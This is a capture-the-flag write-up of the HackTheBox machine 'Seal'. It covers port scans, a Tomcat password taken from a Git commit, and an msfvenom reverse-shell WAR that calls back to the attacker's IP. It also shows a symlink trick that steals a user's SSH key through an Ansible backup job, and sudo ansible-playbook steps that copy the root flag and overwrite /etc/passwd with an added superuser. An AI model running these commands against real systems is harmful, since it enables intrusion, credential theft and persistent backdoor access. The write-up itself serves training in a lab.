# Seal hackthebox Writeup

## All Ports Scan

```bash
# Nmap 7.91 scan initiated Sun Jul 11 18:02:45 2021 as: nmap -T4 -sT -vv -p- -oA nmap/allports 10.129.180.193
Warning: 10.129.180.193 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.129.180.193
Host is up, received echo-reply ttl 63 (0.15s latency).
Scanned at 2021-07-11 18:02:45 -06 for 1050s
Not shown: 65218 closed ports, 314 filtered ports
Reason: 65218 conn-refused and 314 no-responses
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack
443/tcp  open  https      syn-ack
8080/tcp open  http-proxy syn-ack

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sun Jul 11 18:20:15 2021 -- 1 IP address (1 host up) scanned in 1050.42 seconds
```

## Complete Scan

```bash
# Nmap 7.91 scan initiated Sun Jul 11 18:32:35 2021 as: nmap -T4 -sT -sV -sC -A -vv -p22,443,8080 -oA nmap/complete 10.129.180.193
Nmap scan report for seal.htb (10.129.180.193)
Host is up, received echo-reply ttl 63 (0.24s latency).
Scanned at 2021-07-11 18:32:36 -06 for 55s

PORT     STATE SERVICE    REASON  VERSION
22/tcp   open  ssh        syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC1FohcrXkoPYUOtmzAh5PlCU2H0+sFcGl6XXS6vX2lLJ3RD2Vd+KlcYtc2wQLjcYJhkFe793jmkogOSh0uI+fKQA9z1Ib3J0vtsIaNkXxvSMPcr54QxXgg1guaM1OQl43ePUADXnB6WqAg8QyF6Nxoa18vboOAu3a8Wn9Qf9iCpoU93d5zQj+FsBKVaDs3zuJkUBRfjsqq7rEMpxqCfkFIeUrJF9MBsQhgsEVUbo1zicWG32m49PgDbKr9yE3lPsV9K4b9ugNQ3zwWW5a1OpOs+r3AxFcu2q65N2znV3/p41ul9+fWXo9pm0jJPJ3V5gZphDkXVZEw16K2hcgQcQJUH7luaVTRpzqDxXaiK/8wChtMXEUjFQKL6snEskkRxCg+uLO6HjI19dJ7sTBUkjdMK58TM5RmK8EO1VvbCAAdlMs8G064pSFKxY/iQjp7VWuaqBUetpplESpIe6Bz+tOyTJ8ZyhkJimFG80iHoKWYI2TOa5FdlXod1NvTIkCLD2U=
|   256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBD+SiHX7ZTaXWFgBUKSVlFmMYtqF7Ihjfdc51aEdxFdB3xnRWVYSJd2JhOX1k/9V62eZMhR/4Lc8pJWQJHdSA/c=
|   256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXLlJgua8pjAw5NcWgGDwXoASfUOqUlpeQxd66seKyT
443/tcp  open  ssl/http   syn-ack nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Seal Market
| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK/emailAddress=admin@seal.htb/localityName=Hackney/organizationalUnitName=Infra
| Issuer: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK/emailAddress=admin@seal.htb/localityName=hackney/organizationalUnitName=Infra
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-05-05T10:24:03
| Not valid after:  2022-05-05T10:24:03
| MD5:   9c4f 991a bb97 192c df5a c513 057d 4d21
| SHA-1: 0de4 6873 0ab7 3f90 c317 0f7b 872f 155b 305e 54ef
| -----BEGIN CERTIFICATE-----
| MIIDiDCCAnACAWQwDQYJKoZIhvcNAQELBQAwgYkxCzAJBgNVBAYTAlVLMQ8wDQYD
| VQQIDAZMb25kb24xEDAOBgNVBAcMB2hhY2tuZXkxFTATBgNVBAoMDFNlYWwgUHZ0
| IEx0ZDEOMAwGA1UECwwFSW5mcmExETAPBgNVBAMMCHNlYWwuaHRiMR0wGwYJKoZI
| hvcNAQkBFg5hZG1pbkBzZWFsLmh0YjAeFw0yMTA1MDUxMDI0MDNaFw0yMjA1MDUx
| MDI0MDNaMIGJMQswCQYDVQQGEwJVSzEPMA0GA1UECAwGTG9uZG9uMRAwDgYDVQQH
| DAdIYWNrbmV5MRUwEwYDVQQKDAxTZWFsIFB2dCBMdGQxDjAMBgNVBAsMBUluZnJh
| MREwDwYDVQQDDAhzZWFsLmh0YjEdMBsGCSqGSIb3DQEJARYOYWRtaW5Ac2VhbC5o
| dGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDafbynnscdjWeuXTrD
| M36rTJ0y2pJpDDFe9ngryz/xw1KsoPfEDrDE0XHc8LVlD9cxXd/8+0feeV34d63s
| YyZ0t5tHlAKw1h9TEa/og1yR1MyxZRf+K/wcX+OwXYFtMHkXCZFH7TPXLKtCrMJM
| Z6GCt3f1ccrI10D+/dMo7eyQJsat/1e+6PgrTWRxImcjOCDOZ1+mlfSkvmr5TUBW
| SU3uil2Qo5Kj9YLCPisjKpVuyhHU6zZ5KuBXkudaPS0LuWQW1LTMyJzlRfoIi9J7
| E2uUQglrTKKyd3g4BhWUABbwyxoj2WBbgvVIdCGmg6l8JPRZXwdLaPZ/FbHEQ47n
| YpmtAgMBAAEwDQYJKoZIhvcNAQELBQADggEBAJZGFznhRSEa2DTgevXl1T8uxpiG
| PPd9R0whiIv3s225ir9SWW3Hl1tVkEY75G4PJA/DxmBIHxIK1OU8kZMuJUevnSIC
| rK16b9Y5Y1JEnaQwfKCoQILMU40ED76ZIJigGqAoniGCim/mwR1F1r1g63oUttDT
| aGLrpvN6XVkqSszpxTMMHk3SqwNaKzsaPKWPGuEbj9GGntRo1ysqZfBttgUMFIzl
| 7un7bBMIn+SPFosNGBmXIU9eyR7zG+TmpGYvTgsw0ZJqZL9yQIcszJQZPV3HuLJ8
| 8srMeWYlzSS1SOWrohny4ov8jpMjWkbdnDNGRMXIUpapho1R82hyP7WEfwc=
|_-----END CERTIFICATE-----
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
8080/tcp open  http-proxy syn-ack
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date: Sun, 11 Jul 2021 13:10:22 GMT
|     Set-Cookie: JSESSIONID=node0tht9zflmnzax1m28vpb9wmlvx3.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   GetRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date: Sun, 11 Jul 2021 13:10:20 GMT
|     Set-Cookie: JSESSIONID=node0ihj8f99tmnqni5p9214l1er31.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sun, 11 Jul 2021 13:10:20 GMT
|     Set-Cookie: JSESSIONID=node0tvk3fv94oycir0o2b1v135w22.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Allow: GET,HEAD,POST,OPTIONS
|     Content-Length: 0
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   Socks4: 
|     HTTP/1.1 400 Illegal character CNTL=0x4
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x4</pre>
|   Socks5: 
|     HTTP/1.1 400 Illegal character CNTL=0x5
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x5</pre>
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.91%I=7%D=7/11%Time=60EB8DAB%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,F3,"HTTP/1\.1\x20401\x20Unauthorized\r\nDate:\x20Sun,\x2011\x2
SF:0Jul\x202021\x2013:10:20\x20GMT\r\nSet-Cookie:\x20JSESSIONID=node0ihj8f
SF:99tmnqni5p9214l1er31\.node0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Thu,
SF:\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Type:\x20text/html;
SF:charset=utf-8\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,107,"HTTP
SF:/1\.1\x20200\x20OK\r\nDate:\x20Sun,\x2011\x20Jul\x202021\x2013:10:20\x2
SF:0GMT\r\nSet-Cookie:\x20JSESSIONID=node0tvk3fv94oycir0o2b1v135w22\.node0
SF:;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2000
SF::00:00\x20GMT\r\nContent-Type:\x20text/html;charset=utf-8\r\nAllow:\x20
SF:GET,HEAD,POST,OPTIONS\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,A
SF:D,"HTTP/1\.1\x20505\x20Unknown\x20Version\r\nContent-Type:\x20text/html
SF:;charset=iso-8859-1\r\nContent-Length:\x2058\r\nConnection:\x20close\r\
SF:n\r\n<h1>Bad\x20Message\x20505</h1><pre>reason:\x20Unknown\x20Version</
SF:pre>")%r(FourOhFourRequest,F4,"HTTP/1\.1\x20401\x20Unauthorized\r\nDate
SF::\x20Sun,\x2011\x20Jul\x202021\x2013:10:22\x20GMT\r\nSet-Cookie:\x20JSE
SF:SSIONID=node0tht9zflmnzax1m28vpb9wmlvx3\.node0;\x20Path=/;\x20HttpOnly\
SF:r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-
SF:Type:\x20text/html;charset=utf-8\r\nContent-Length:\x200\r\n\r\n")%r(So
SF:cks5,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x5\r\nConten
SF:t-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nCon
SF:nection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20
SF:Illegal\x20character\x20CNTL=0x5</pre>")%r(Socks4,C3,"HTTP/1\.1\x20400\
SF:x20Illegal\x20character\x20CNTL=0x4\r\nContent-Type:\x20text/html;chars
SF:et=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<
SF:h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20CN
SF:TL=0x4</pre>")%r(RPCCheck,C7,"HTTP/1\.1\x20400\x20Illegal\x20character\
SF:x20OTEXT=0x80\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nConte
SF:nt-Length:\x2071\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x204
SF:00</h1><pre>reason:\x20Illegal\x20character\x20OTEXT=0x80</pre>");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 5.0 - 5.3 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=7/11%OT=22%CT=%CU=34801%PV=Y%DS=2%DC=T%G=N%TM=60EB8DDB%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 36.837 days (since Fri Jun  4 22:28:21 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   205.99 ms 10.10.14.1
2   206.13 ms seal.htb (10.129.180.193)

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul 11 18:33:31 2021 -- 1 IP address (1 host up) scanned in 56.20 seconds
```

## Port 443 Enumeration

Only the static webpage is running so i move forward to another port.

![](Images/Pasted%20image%2020210712070503.png)

And here we found a gitbucket login page.

![](Images/Pasted%20image%2020210712070549.png)

Let's try to create account.

Then i created a account and logged in.


![](Images/Pasted%20image%2020210712070651.png)

And here we see the tomcat, nginx and app directory but only the basic info about webserver nothing more.

Then i payed attention on commit section.

![](Images/Pasted%20image%2020210712070818.png)

We got two commits related to tomcat users.

![](Images/Pasted%20image%2020210712070848.png)

```xml
<user username="tomcat" password="42MrHBf*z8{Z%" roles="manager-gui,admin-gui"/>
```

And here we got the tomcat credentials.

Let's try to login.

First i try to login in but the /manager/html shows 403.
So i looked forward to search for directory 

![](Images/Pasted%20image%2020210712071438.png)

And here we got two directory in /text it shows access denied then i logged in with status.

![](Images/Pasted%20image%2020210712071614.png)

But while try to upload file it redirect to /manager/html

so i again use dirsearch to find more directory.

![](Images/Pasted%20image%2020210712071957.png)

Now we are logged in properly in tomcat

![](Images/Pasted%20image%2020210712072024.png)

Then i genrated a shell using msfconsole but while uploading shows the error.

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.98 LPORT=443 -f war > shell.war
```

![](Images/Pasted%20image%2020210712072311.png)

Then i intercept the request from burpsuite and see it is going directly to the /manager/html
so i added a path

![](Images/Pasted%20image%2020210712072657.png)

And now shell is uploaded 

![](Images/Pasted%20image%2020210712072557.png)

And now we are in the box.

![](Images/Pasted%20image%2020210712072747.png)

## Previlege Escalation User

![](Images/Pasted%20image%2020210712073052.png)

And here we got 2 files one is backup and another 1 is run.yml

![](Images/Pasted%20image%2020210712074929.png)

```yml
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/
```

Its doing very easy thing just creating a archive data present on the /var/lib/tomcat9/webapps/ROOT/admin/dashboard to /opt/backups/archives/

let's create a test file in /var/lib/tomcat9/webapps/ROOT/admin/dashboard and look into that.

```bash
$ ln -s ~/home/luis/.ssh/id_rsa /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/id_rsa
$ cp backup-2021-07-11-16:33:38.gz /dev/shm
$ cd /dev/shm
$ mv backup-2021-07-11-16:33:38.gz backup.tar.gz
$ tar -xvf backup.tar.gz
```


And here we got the user

![](Images/Pasted%20image%2020210712093140.png)

## Previlege Escalation root

Here we are permission to run ansible-playebook as a super user..

![](Images/Pasted%20image%2020210712101354.png)

This blog help me to learn about ansible-playbook.

```blog
https://docs.ansible.com/ansible/2.5/modules/copy_module.html
```

```yml
- name: Ansible Copy Example Local to Remote
  hosts: localhost
  tasks:
    - name: copying file with playbook
      become: true 
      copy:
        src: /root/root.txt
        dest: /dev/shm
        owner: luis
        group: luis        
        mode: 0777
```

Here we got a root flag.

![](Images/Pasted%20image%2020210712101608.png)

But we need a persistant shell.

So i copyied the /etc/passwd and added a new user entry on it with super user previledges.

```yml
- name: Ansible Copy Example Local to Remote
  hosts: localhost
  tasks:
    - name: copying file with playbook
      become: true 
      copy:
        src: /dev/shm/passwd
        dest: /etc
        owner: root
        group: root        
        mode: 0644
```

![](Images/Pasted%20image%2020210712104803.png)